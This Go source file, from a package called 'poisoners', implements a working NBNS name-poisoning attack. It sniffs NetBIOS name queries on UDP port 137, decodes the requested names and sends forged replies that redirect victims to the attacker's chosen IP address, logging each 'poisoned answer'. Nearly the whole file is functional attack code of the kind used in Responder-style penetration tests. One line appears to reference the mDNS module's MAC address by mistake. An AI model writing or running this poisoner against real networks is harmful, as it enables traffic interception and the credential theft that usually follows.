package poisoners

import (
	"bytes"
	"log"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const (
	bpfNBNSFilter string = "(udp and dst port 137)"
)

var (
	NBNS_Ans = [][]uint8{
		[]byte{},                       // TID
		[]byte{0x85, 0x00},             // Flags
		[]byte{0x00, 0x00},             // Question
		[]byte{0x00, 0x01},             // AnswerRRS
		[]byte{0x00, 0x00},             // AuthorityRSS
		[]byte{0x00, 0x00},             // AdditionalRRS
		[]byte{},                       // AnswerNameLen
		[]byte{},                       // AnswerName
		[]byte{0x00},                   // AnswerNameNull
		[]byte{0x00, 0x20},             // Type
		[]byte{0x00, 0x01},             // Class1
		[]byte{0x00, 0x00, 0x00, 0xa5}, // TTL - Poison for 2min 45sec
		[]byte{0x00, 0x06},             // Len
		[]byte{0x00, 0x00},             // Flags1
		[]byte{},                       // IP (4 bytes)
	}

	mainNBNSDetails sendInfo
)

// Encodes a NetBIOS name
// Helpful link: https://jeffpar.github.io/kbarchive/kb/194/Q194203/
func EncodeNetbiosName(name [16]byte) [32]byte {
	encoded := [32]byte{}

	for i := 0; i < 16; i++ {
		if name[i] == 0 {
			encoded[(i * 2)] = 'C'
			encoded[(i*2)+1] = 'A'
		} else {
			encoded[(i * 2)] = (name[i] >> 4) + 0x41
			encoded[(i*2)+1] = (name[i] & 0xf) + 0x41
		}
	}

	return encoded
}

// Decodes the NetBIOS name
func DecodeNetbiosName(name [32]byte) [16]byte {
	decoded := [16]byte{}

	for i := 0; i < 16; i++ {
		if name[(i*2)+0] == 'C' && name[(i*2)+1] == 'A' {
			decoded[i] = 0
		} else {
			firstchar := (name[(i*2)] - 0x41) << 4
			secondchar := (name[(i*2)+1] - 0x41) & 0xf
			decoded[i] = firstchar | secondchar
		}
	}
	return decoded
}

// Send NetBIOS response packet
func sendNBNSPacket(pdetails packetDetails, payload []byte) {
	// Setup options
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	buffer := gopacket.NewSerializeBuffer()

	// Build the packetpacket
	ipLayer := &layers.IPv4{
		SrcIP:    pdetails.dstIP,
		DstIP:    pdetails.srcIP,
		Version:  4,
		Flags:    layers.IPv4DontFragment,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
		IHL:      5,
	}
	ethernetLayer := &layers.Ethernet{
		DstMAC:       pdetails.srcMAC,
		EthernetType: layers.EthernetTypeIPv4,
		SrcMAC:       pdetails.dstMAC,
	}
	udpLayer := &layers.UDP{
		SrcPort: pdetails.dstPort,
		DstPort: pdetails.srcPort,
	}
	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
	if err != nil {
		log.Printf("[NBNS] Error creating UDP layer: %s\n", err)
		return
	}

	// And create the packet with the layers
	buffer = gopacket.NewSerializeBuffer()
	err = gopacket.SerializeLayers(buffer, options,
		ethernetLayer,
		ipLayer,
		udpLayer,
		gopacket.Payload(payload),
	)
	if err != nil {
		log.Printf("[NBNS] Error serializing packet: %s\n", err)
		return
	}

	outgoingPacket := buffer.Bytes()

	// Send our packet and don't worry if there is an error
	err = mainNBNSDetails.handle.WritePacketData(outgoingPacket)
	if err != nil {
		log.Printf("[NBNS] Error sending poison to %s\n%s\n", pdetails.srcIP, err)
		return
	}

	log.Printf("[NBNS] Poisoned answer sent to %s for name %s\n", pdetails.srcIP, pdetails.requestNameDecoded)
}

func createNBNSResponsePayload(pdetails packetDetails) []byte {
	payload := []byte{}
	res := NBNS_Ans

	// Set TID (0)
	res[0] = pdetails.transactionID

	// Set AnswerNameLen (6)
	res[6] = pdetails.requestNameLen

	// Set AnswerName (7)
	res[7] = pdetails.requestName

	// Set IPv4 (14)
	res[14] = pdetails.dstIP

	for _, v := range res {
		for _, b := range v {
			payload = append(payload, byte(b))
		}
	}

	return payload
}

func parseNBNSPacket(packet gopacket.Packet) packetDetails {
	var details packetDetails
	details.dstIP = mainNBNSDetails.respondIP

	ip6Layer := packet.Layer(layers.LayerTypeIPv6)
	if ip6Layer != nil {
		details.ipType = 6
		ip, _ := ip6Layer.(*layers.IPv6)
		details.srcIP = ip.SrcIP
	}

	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	if ipLayer != nil {
		details.ipType = 4
		ip, _ := ipLayer.(*layers.IPv4)
		details.srcIP = ip.SrcIP
	}

	// Get Ethernet layer
	ethLayer := packet.Layer(layers.LayerTypeEthernet)
	if ethLayer != nil {
		eth, _ := ethLayer.(*layers.Ethernet)
		details.srcMAC = eth.SrcMAC
		details.dstMAC = mainMDNSDetails.respondMAC
	}

	// Get UDP layer
	udpLayer := packet.Layer(layers.LayerTypeUDP)
	if udpLayer != nil {
		udp, _ := udpLayer.(*layers.UDP)
		details.srcPort = udp.SrcPort
		details.dstPort = udp.DstPort

		// Get transaction ID
		details.transactionID = udp.Payload[:2]

		// Get query name length
		details.requestNameLen = []byte{udp.Payload[12]}

		// Get query name
		// Should always be 32 bytes
		nameLength := 32
		details.requestName = udp.Payload[13 : 13+nameLength]

		// Replace 0x05 with a period
		//details.requestName = bytes.ReplaceAll(details.requestName, []byte{0x05}, []byte("."))

		// Decode NetBIOS name to readable string
		var encodedName [32]byte

		for i, c := range details.requestName {
			encodedName[i] = c
		}
		decodedBytes := DecodeNetbiosName(encodedName)
		var decode []byte
		decode = decodedBytes[:]
		decode = bytes.Trim(decode, "\x00")
		details.requestNameDecoded = string(decode)

	}

	return details
}

// Capture only NBNS packets
func filter_NBNS(pcapHandle *pcap.Handle) {
	// Set filter for NBNS broadcast
	err := pcapHandle.SetBPFFilter(bpfNBNSFilter)
	if err != nil {
		log.Fatal(err)
	}

	// set packet source
	packetSource := gopacket.NewPacketSource(pcapHandle, pcapHandle.LinkType())

	// Process packets
	for packet := range packetSource.Packets() {
		// Parse the details of the packet
		pd := parseNBNSPacket(packet)
		log.Printf("[NBNS] Request by %s for %s\n", pd.srcIP, pd.requestNameDecoded)

		// If analyze is false, then we will poison
		if !mainNBNSDetails.analyze {
			// Create new response packet
			response := createNBNSResponsePayload(pd)

			// FIX ME
			// Sent response packet only to IPv4 for now
			if pd.ipType == 4 {
				sendNBNSPacket(pd, response)
			}
		}
	}
}

func StartNBNS(pcapHandle *pcap.Handle, ip net.IP, mac net.HardwareAddr, analyze bool) {

	// Setup the main details with
	// handle, analyze, IP and MAC we want to respond with
	mainNBNSDetails = sendInfo{handle: pcapHandle, respondIP: ip, respondMAC: mac, analyze: analyze}

	// Start poinson/filtering packets
	filter_NBNS(pcapHandle)
}
